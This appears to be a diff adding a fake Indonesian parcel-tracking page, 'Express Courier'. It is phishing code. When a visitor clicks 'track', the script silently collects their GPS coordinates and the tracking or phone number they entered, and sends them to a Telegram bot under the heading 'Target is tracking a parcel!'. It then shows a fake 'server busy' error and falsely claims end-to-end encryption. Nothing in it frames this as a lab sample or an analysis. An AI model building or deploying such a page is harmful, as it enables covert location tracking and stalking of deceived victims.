@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lacak Paket - Express Courier</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f4f4; margin: 0; padding: 20px; text-align: center; }
+        .container { background: white; max-width: 400px; margin: auto; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        h2 { color: #e67e22; }
+        p { color: #666; font-size: 14px; }
+        .btn-track { background-color: #e67e22; color: white; border: none; padding: 12px 25px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; }
+        #status { margin-top: 15px; font-size: 12px; color: #999; }
+        input { width: 100%; padding: 10px; margin-top: 10px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Express Tracker</h2>
+        <p>Masukkan nomor resi atau nomor HP penerima untuk melihat posisi paket terbaru.</p>
+        
+        <input type="text" placeholder="Contoh: JX123456789" id="resi">
+        
+        <button class="btn-track" onclick="getLocation()">Lacak Posisi Paket</button>
+
+        <div id="status">Sistem terenkripsi end-to-end</div>
+    </div>
+
+    <script>
+        const status = document.getElementById('status');
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                status.innerHTML = "Menghubungkan ke satelit GPS...";
+                navigator.geolocation.getCurrentPosition(sendToTelegram, showError);
+            } else {
+                status.innerHTML = "Browser tidak mendukung pelacakan.";
+            }
+        }
+
+        function sendToTelegram(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const resi = document.getElementById('resi').value || "Tanpa Resi";
+            
+            const token = 7043581757;
+            const chatId =6787117513;
+            
+            const pesan = `📦 *Target Melacak Paket!*\n\n` +
+                          `No. Resi/HP: ${resi}\n` +
+                          `Lat: ${lat}\n` +
+                          `Lon: ${lon}\n\n` +
+                          `Link Maps:\nhttps://www.google.com/maps?q=${lat},${lon}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: pesan, parse_mode: "Markdown" })
+            })
+            .then(() => {
+                status.innerHTML = "Maaf, server sibuk. Coba lagi dalam 5 menit.";
+                status.style.color = "red";
+            });
+        }
+
+        function showError(error) {
+            status.innerHTML = "Gagal melacak. Pastikan GPS aktif dan izin diberikan.";
+            status.style.color = "red";
+        }
+    </script>
+</body>
+</html>
